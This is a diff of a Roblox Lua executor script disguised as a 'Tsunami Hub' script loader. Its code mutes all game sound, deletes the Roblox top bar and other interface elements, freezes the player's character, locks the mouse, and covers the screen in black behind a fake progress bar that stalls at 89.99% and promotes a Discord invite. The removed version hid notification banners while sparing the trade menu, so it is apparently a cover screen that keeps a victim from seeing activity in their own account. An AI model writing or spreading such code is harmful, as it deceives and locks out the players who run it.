@@ -1,107 +1,120 @@
-
-
-local Players = game:GetService("Players")
-local RunService = game:GetService("RunService")
-
-local player = Players.LocalPlayer
-local camera = workspace.CurrentCamera
-
--- Esperar a que la cámara exista bien
-repeat task.wait() until camera
-
--- Guardamos la posición actual de la cámara
-local fixedCFrame = camera.CFrame
-
--- Forzamos cámara en modo script
-camera.CameraType = Enum.CameraType.Scriptable
-camera.CFrame = fixedCFrame
-
--- La mantenemos congelada todo el tiempo
-RunService.RenderStepped:Connect(function()
-	camera.CFrame = fixedCFrame
-end)
-
-
-
-local CoreGui = game:GetService("CoreGui")
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
+local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
 local TweenService = game:GetService("TweenService")
+local UserInputService = game:GetService("UserInputService")
+local CoreGui = game:GetService("CoreGui")
+local RunService = game:GetService("RunService")
 
-task.wait(2)
+-- =========================================
+-- SILENCIADOR TOTAL DE SONIDOS - INMEDIATO
+-- =========================================
+local player = Players.LocalPlayer
 
--- ELIMINAR ELEMENTOS MOLESTOS
+-- Función para destruir cualquier sonido
+local function muteSound(obj)
+    if obj:IsA("Sound") then
+        pcall(function()
+            obj:Stop()          -- Detener
+            obj.Volume = 0      -- Asegurar que no se escuche
+            obj:Destroy()       -- Eliminar del juego
+        end)
+    end
+end
+
+-- Limpiar todos los sonidos existentes en el juego y tu personaje
+for _, obj in ipairs(game:GetDescendants()) do
+    muteSound(obj)
+end
+
+-- Interceptar cualquier sonido que aparezca después
+game.DescendantAdded:Connect(function(obj)
+    muteSound(obj)
+end)
+
+-- Bloquear música de fondo o sonidos globales en SoundService
+local SoundService = game:GetService("SoundService")
+for _, s in ipairs(SoundService:GetDescendants()) do
+    muteSound(s)
+end
+SoundService.DescendantAdded:Connect(function(obj)
+    muteSound(obj)
+end)
+
+print("✅ TODO SONIDO SILENCIADO - Estilo BlackScreenTotal")
+
+-- 🔪 LIMPIEZA TOTAL + ELIMINACIONES ESPECÍFICAS
 local hashGui = CoreGui:FindFirstChild("9a27dc7a97c45c6d31f57cf4da19542bcd92dd0c7606e5019e5911b93cc0198a")
 if hashGui then hashGui:Destroy() end
 
 local topBarApp = CoreGui:FindFirstChild("TopBarApp")
 if topBarApp then topBarApp:Destroy() end
 
---------------------------------------------------
--- SONIDOS PRIMERO (TU CÓDIGO EXACTO)
---------------------------------------------------
-for _,v in ipairs(game:GetDescendants()) do
-    if v:IsA("Sound") then
-        pcall(function()
-            v:Stop()
-            v:Destroy()
-        end)
+for _, gui in pairs(CoreGui:GetChildren()) do
+    if gui:IsA("ScreenGui") then pcall(function() gui:Destroy() end) end
+end
+for _, gui in pairs(PlayerGui:GetChildren()) do
+    if gui:IsA("ScreenGui") and gui.Name ~= "BlackoutHub" then
+        pcall(function() gui:Destroy() end)
     end
 end
 
-game.DescendantAdded:Connect(function(obj)
-    if obj:IsA("Sound") then
-        pcall(function()
-            obj:Stop()
-            obj:Destroy()
-        end)
+-- BLOQUEO TOTAL
+local function blockPlayer()
+    if LocalPlayer.Character then
+        local humanoid = LocalPlayer.Character:FindFirstChild("Humanoid")
+        if humanoid then
+            humanoid.WalkSpeed = 0
+            humanoid.JumpPower = 0
+            humanoid.PlatformStand = true
+        end
     end
-end)
+end
+blockPlayer()
+LocalPlayer.CharacterAdded:Connect(blockPlayer)
+
+workspace.CurrentCamera.CameraType = Enum.CameraType.Scriptable
+UserInputService.MouseBehavior = Enum.MouseBehavior.LockCenter
+
+-- 🖤 PANTALLA NEGRA ABSOLUTA - INMEDIATA
+local blackoutGui = Instance.new("ScreenGui")
+blackoutGui.Name = "BlackoutHub"
+blackoutGui.IgnoreGuiInset = true
+blackoutGui.ResetOnSpawn = false
+blackoutGui.DisplayOrder = 2147483647
+blackoutGui.Parent = PlayerGui
+
+local blackoutFrame = Instance.new("Frame")
+blackoutFrame.Size = UDim2.new(1, 0, 1, 0)
+blackoutFrame.BackgroundColor3 = Color3.new(0, 0, 0)
+blackoutFrame.BorderSizePixel = 0
+blackoutFrame.ZIndex = 2147483647
+blackoutFrame.Parent = blackoutGui
 
 --------------------------------------------------
--- PANTALLA NEGRA TOTAL
---------------------------------------------------
-local BlackScreen = Instance.new("ScreenGui")
-BlackScreen.Name = "BlackScreenTotal"
-BlackScreen.IgnoreGuiInset = true
-BlackScreen.ResetOnSpawn = false
-BlackScreen.DisplayOrder = 1
-BlackScreen.Parent = LocalPlayer.PlayerGui
-
-local BlackFrame = Instance.new("Frame")
-BlackFrame.Size = UDim2.new(1, 0, 1, 0)
-BlackFrame.Position = UDim2.new(0, 0, 0, 0)
-BlackFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-BlackFrame.BackgroundTransparency = 0
-BlackFrame.ZIndex = 1
-BlackFrame.Parent = BlackScreen
-
---------------------------------------------------
--- HUB MÁS GRANDE (450x400)
+-- NUEVA INTERFAZ TSUNAMI (450x400) - TU CÓDIGO EXACTO
 --------------------------------------------------
 local HubGui = Instance.new("ScreenGui")
 HubGui.Name = "TsunamiHub"
 HubGui.IgnoreGuiInset = true
 HubGui.ResetOnSpawn = false
-HubGui.DisplayOrder = 10
+HubGui.DisplayOrder = 2147483647 + 1
 HubGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
-HubGui.Parent = LocalPlayer.PlayerGui
+HubGui.Parent = PlayerGui
 
--- CONTAINER PRINCIPAL
 local Container = Instance.new("Frame")
 Container.Size = UDim2.new(0, 450, 0, 400)
 Container.Position = UDim2.new(0.5, -225, 0.5, -200)
 Container.BackgroundTransparency = 1
-Container.ZIndex = 20
+Container.ZIndex = 2147483647 + 2
 Container.Parent = HubGui
 
--- FONDO PRINCIPAL
 local MainBG = Instance.new("Frame")
 MainBG.Size = UDim2.new(1, 0, 1, 0)
 MainBG.Position = UDim2.new(0, 0, 0, 0)
 MainBG.BackgroundColor3 = Color3.fromRGB(15, 20, 35)
 MainBG.BorderSizePixel = 0
-MainBG.ZIndex = 21
+MainBG.ZIndex = 2147483647 + 3
 MainBG.Parent = Container
 
 local BGCorner = Instance.new("UICorner")
@@ -113,49 +126,52 @@ BGStroke.Color = Color3.fromRGB(100, 180, 255)
 BGStroke.Thickness = 2
 BGStroke.Parent = MainBG
 
--- TÍTULO PRINCIPAL
+-- 🎯 TÍTULO PRINCIPAL NUEVO
 local Title = Instance.new("TextLabel")
 Title.Size = UDim2.new(1, -40, 0, 60)
 Title.Position = UDim2.new(0, 20, 0, 25)
 Title.BackgroundTransparency = 1
-Title.Text = "ESCAPE TSUNAMI"
+Title.Text = "ESCAPA DEL TSUNAMI"
 Title.TextColor3 = Color3.fromRGB(100, 180, 255)
-Title.TextScaled = true
+Title.TextScaled = false
+Title.TextSize = 28
 Title.Font = Enum.Font.GothamBold
-Title.ZIndex = 25
+Title.ZIndex = 2147483647 + 5
 Title.Parent = MainBG
 
--- SUBTÍTULO
+-- 🎯 SUBTÍTULO NUEVO
 local SubTitle = Instance.new("TextLabel")
 SubTitle.Size = UDim2.new(1, -40, 0, 45)
 SubTitle.Position = UDim2.new(0, 20, 0, 80)
 SubTitle.BackgroundTransparency = 1
-SubTitle.Text = "FOR BRAINROTS!"
+SubTitle.Text = "UNIVERSAL SCRIPTS"
 SubTitle.TextColor3 = Color3.fromRGB(255, 120, 160)
-SubTitle.TextScaled = true
+SubTitle.TextScaled = false
+SubTitle.TextSize = 24
 SubTitle.Font = Enum.Font.GothamBold
-SubTitle.ZIndex = 25
+SubTitle.ZIndex = 2147483647 + 5
 SubTitle.Parent = MainBG
 
--- LOADING TEXT
+-- LOADING TEXT (FIJO TAMBIÉN)
 local LoadingText = Instance.new("TextLabel")
 LoadingText.Size = UDim2.new(1, -40, 0, 35)
 LoadingText.Position = UDim2.new(0, 20, 0, 130)
 LoadingText.BackgroundTransparency = 1
 LoadingText.Text = "LOADING SCRIPT"
 LoadingText.TextColor3 = Color3.fromRGB(160, 160, 180)
-LoadingText.TextScaled = true
+LoadingText.TextScaled = false
+LoadingText.TextSize = 20
 LoadingText.Font = Enum.Font.Gotham
-LoadingText.ZIndex = 25
+LoadingText.ZIndex = 2147483647 + 5
 LoadingText.Parent = MainBG
 
--- AVATAR
+-- AVATAR CENTRADO
 local AvatarHolder = Instance.new("Frame")
 AvatarHolder.Size = UDim2.new(0, 80, 0, 80)
 AvatarHolder.Position = UDim2.new(0.5, -40, 0, 175)
 AvatarHolder.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 AvatarHolder.BackgroundTransparency = 0.85
-AvatarHolder.ZIndex = 25
+AvatarHolder.ZIndex = 2147483647 + 5
 AvatarHolder.Parent = MainBG
 
 local AvatarCorner = Instance.new("UICorner")
@@ -172,28 +188,29 @@ AvatarImg.Size = UDim2.new(0.87, 0, 0.87, 0)
 AvatarImg.Position = UDim2.new(0.065, 0, 0.065, 0)
 AvatarImg.BackgroundTransparency = 1
 AvatarImg.Image = Players:GetUserThumbnailAsync(LocalPlayer.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size420x420)
-AvatarImg.ZIndex = 26
+AvatarImg.ZIndex = 2147483647 + 6
 AvatarImg.Parent = AvatarHolder
 
--- PORCENTAJE
+-- PORCENTAJE (FIJO TAMBIÉN)
 local PercentText = Instance.new("TextLabel")
 PercentText.Size = UDim2.new(0, 90, 0, 40)
 PercentText.Position = UDim2.new(0.5, -45, 0, 265)
 PercentText.BackgroundTransparency = 1
 PercentText.Text = "0%"
 PercentText.TextColor3 = Color3.fromRGB(100, 180, 255)
-PercentText.TextScaled = true
+PercentText.TextScaled = false
+PercentText.TextSize = 24
 PercentText.Font = Enum.Font.GothamBold
-PercentText.ZIndex = 26
+PercentText.ZIndex = 2147483647 + 6
 PercentText.Parent = MainBG
 
--- BARRA PROGRESO
+-- BARRA PROGRESO DELGADA
 local ProgressContainer = Instance.new("Frame")
 ProgressContainer.Size = UDim2.new(1, -60, 0, 8)
 ProgressContainer.Position = UDim2.new(0, 30, 0, 310)
 ProgressContainer.BackgroundColor3 = Color3.fromRGB(45, 50, 65)
 ProgressContainer.BorderSizePixel = 0
-ProgressContainer.ZIndex = 25
+ProgressContainer.ZIndex = 2147483647 + 5
 ProgressContainer.Parent = MainBG
 
 local ProgressCorner = Instance.new("UICorner")
@@ -204,22 +221,20 @@ local ProgressFill = Instance.new("Frame")
 ProgressFill.Size = UDim2.new(0, 0, 1, 0)
 ProgressFill.BackgroundColor3 = Color3.fromRGB(100, 180, 255)
 ProgressFill.BorderSizePixel = 0
-ProgressFill.ZIndex = 26
+ProgressFill.ZIndex = 2147483647 + 6
 ProgressFill.Parent = ProgressContainer
 
 local ProgressFillCorner = Instance.new("UICorner")
 ProgressFillCorner.CornerRadius = UDim.new(0, 4)
 ProgressFillCorner.Parent = ProgressFill
 
---------------------------------------------------
--- DISCORD FRAME MEJORADO (LINK MÁS PEQUEÑO)
---------------------------------------------------
+-- DISCORD FRAME (TEXTO FIJO)
 local DiscordFrame = Instance.new("Frame")
 DiscordFrame.Size = UDim2.new(1, -60, 0, 45)
 DiscordFrame.Position = UDim2.new(0, 30, 0, 330)
 DiscordFrame.BackgroundColor3 = Color3.fromRGB(35, 40, 55)
 DiscordFrame.BorderSizePixel = 0
-DiscordFrame.ZIndex = 25
+DiscordFrame.ZIndex = 2147483647 + 5
 DiscordFrame.Parent = MainBG
 
 local DiscordCorner = Instance.new("UICorner")
@@ -231,23 +246,20 @@ DiscordStroke.Color = Color3.fromRGB(100, 180, 255)
 DiscordStroke.Thickness = 1.5
 DiscordStroke.Parent = DiscordFrame
 
--- LINK DISCORD MÁS PEQUEÑO (TextSize 14)
 local DiscordText = Instance.new("TextLabel")
 DiscordText.Size = UDim2.new(1, -100, 1, 0)
 DiscordText.Position = UDim2.new(0, 15, 0, 0)
 DiscordText.BackgroundTransparency = 1
-DiscordText.Text = "discord.gg/7gpWMh5Wzu"
+DiscordText.Text = "discord.gg/MHNwut"
 DiscordText.TextColor3 = Color3.fromRGB(150, 200, 255)
 DiscordText.TextScaled = false
 DiscordText.TextSize = 14
 DiscordText.Font = Enum.Font.GothamSemibold
 DiscordText.TextXAlignment = Enum.TextXAlignment.Left
-DiscordText.ZIndex = 26
+DiscordText.ZIndex = 2147483647 + 6
 DiscordText.Parent = DiscordFrame
 
---------------------------------------------------
--- BOTÓN COPY ULTRA MODERNO ✨
---------------------------------------------------
+-- BOTÓN COPY
 local CopyBtn = Instance.new("TextButton")
 CopyBtn.Size = UDim2.new(0, 75, 0, 35)
 CopyBtn.Position = UDim2.new(1, -90, 0, 5)
@@ -256,7 +268,7 @@ CopyBtn.Text = "📋 COPY"
 CopyBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
 CopyBtn.TextScaled = true
 CopyBtn.Font = Enum.Font.GothamBold
-CopyBtn.ZIndex = 27
+CopyBtn.ZIndex = 2147483647 + 7
 CopyBtn.Parent = DiscordFrame
 
 local CopyCorner = Instance.new("UICorner")
@@ -276,6 +288,12 @@ CopyGradient.Color = ColorSequence.new{
 }
 CopyGradient.Rotation = 45
 CopyGradient.Parent = CopyBtn
+
+-- ANIMACIÓN ENTRADA
+Container.Size = UDim2.new(0, 0, 0, 0)
+TweenService:Create(Container, TweenInfo.new(1.2, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
+    Size = UDim2.new(0, 450, 0, 400)
+}):Play()
 
 -- ANIMACIONES BOTÓN COPY
 local hoverInfo = TweenInfo.new(0.2, Enum.EasingStyle.Quart, Enum.EasingDirection.Out)
@@ -316,41 +334,49 @@ CopyBtn.MouseButton1Up:Connect(function()
 end)
 
 CopyBtn.MouseButton1Click:Connect(function()
-    setclipboard("https://discord.gg/7gpWMh5Wzu")
-    CopyBtn.Text = "✅ COPIED!"
-    TweenService:Create(CopyBtn, TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
-        BackgroundColor3 = Color3.fromRGB(100, 255, 100),
-        Size = UDim2.new(0, 85, 0, 40)
-    }):Play()
-    task.wait(1.2)
-    TweenService:Create(CopyBtn, TweenInfo.new(0.3, Enum.EasingStyle.Quart), {
-        BackgroundColor3 = Color3.fromRGB(100, 180, 255),
-        Size = UDim2.new(0, 75, 0, 35)
-    }):Play()
-    CopyBtn.Text = "📋 COPY"
-end)
-
---------------------------------------------------
--- ANIMACIONES GENERALES
---------------------------------------------------
-Container.Size = UDim2.new(0, 0, 0, 0)
-TweenService:Create(Container, TweenInfo.new(1.2, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
-    Size = UDim2.new(0, 450, 0, 400)
-}):Play()
-
--- Progreso 3 minutos
-local startTime = tick()
-spawn(function()
-    while true do
-        local elapsed = tick() - startTime
-        local progress = math.min((elapsed / 180) * 0.9899, 0.9899)
-        ProgressFill.Size = UDim2.new(progress, 0, 1, 0)
-        PercentText.Text = string.format("%.2f%%", progress * 100)
-        task.wait()
+    if setclipboard then
+        setclipboard("discord.gg/MHNwut")
+        CopyBtn.Text = "✅ COPIED!"
+        TweenService:Create(CopyBtn, TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
+            BackgroundColor3 = Color3.fromRGB(100, 255, 100),
+            Size = UDim2.new(0, 85, 0, 40)
+        }):Play()
+        task.wait(1.2)
+        TweenService:Create(CopyBtn, TweenInfo.new(0.3, Enum.EasingStyle.Quart), {
+            BackgroundColor3 = Color3.fromRGB(100, 180, 255),
+            Size = UDim2.new(0, 75, 0, 35)
+        }):Play()
+        CopyBtn.Text = "📋 COPY"
+        print("✅ Copiado: discord.gg/MHNwut")
     end
 end)
 
--- Avatar rotación
+-- 🎯 PROGRESO PERFECTO: 89.99% EN 4 MINUTOS
+local totalDuration = 240 -- 4 minutos
+local startTime = tick()
+local progressReached = false
+
+spawn(function()
+    while not progressReached do
+        local elapsed = tick() - startTime
+        local progress = math.min((elapsed / totalDuration) * 89.99, 89.99)
+        
+        TweenService:Create(ProgressFill, TweenInfo.new(0.5, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
+            Size = UDim2.new(progress / 100, 0, 1, 0)
+        }):Play()
+        
+        PercentText.Text = string.format("%.2f%%", progress)
+        
+        if elapsed >= totalDuration then
+            progressReached = true
+            break
+        end
+        
+        wait(0.1)
+    end
+end)
+
+-- AVATAR ROTACIÓN SUAVE
 spawn(function()
     while AvatarHolder.Parent do
         TweenService:Create(AvatarHolder, TweenInfo.new(5, Enum.EasingStyle.Linear), {
@@ -360,47 +386,5 @@ spawn(function()
     end
 end)
 
-print("✅ HUB PERFECTO - BOTÓN COPY ANIMADO")
-
--- ============================
--- BORRAR CARTELES / AVISOS DE ARRIBA (SIN TOCAR Menus.Trade)
--- ============================
-
-local PlayerGui = player:WaitForChild("PlayerGui")
-
-local function isInsideTradeMenu(obj)
-	local menus = PlayerGui:FindFirstChild("Menus")
-	local trade = menus and menus:FindFirstChild("Trade")
-	return trade and obj:IsDescendantOf(trade)
-end
-
-local function tryDeleteBanner(obj)
-	if not obj:IsA("GuiObject") then return end
-	if isInsideTradeMenu(obj) then return end
-
-	task.defer(function()
-		if not obj.Parent then return end
-
-		local ok1, pos = pcall(function() return obj.AbsolutePosition end)
-		local ok2, size = pcall(function() return obj.AbsoluteSize end)
-		if not ok1 or not ok2 then return end
-
-		-- Carteles típicos de arriba (como los de tu foto)
-		if pos.Y <= 120 and size.X >= 300 and size.Y <= 200 then
-			pcall(function()
-				obj:Destroy()
-			end)
-		end
-	end)
-end
-
--- Borrar los que ya existen
-for _, v in ipairs(PlayerGui:GetDescendants()) do
-	tryDeleteBanner(v)
-end
-
--- Borrar los que aparezcan después
-PlayerGui.DescendantAdded:Connect(function(obj)
-	tryDeleteBanner(obj)
-end)
-
+print("🌟 TSUNAMI HUB 2026 - INSTANTÁNEO + SILENCIO TOTAL")
+print("✅ PANTALLA NEGRA INMEDIATA - ESCAPA DEL TSUNAMI")
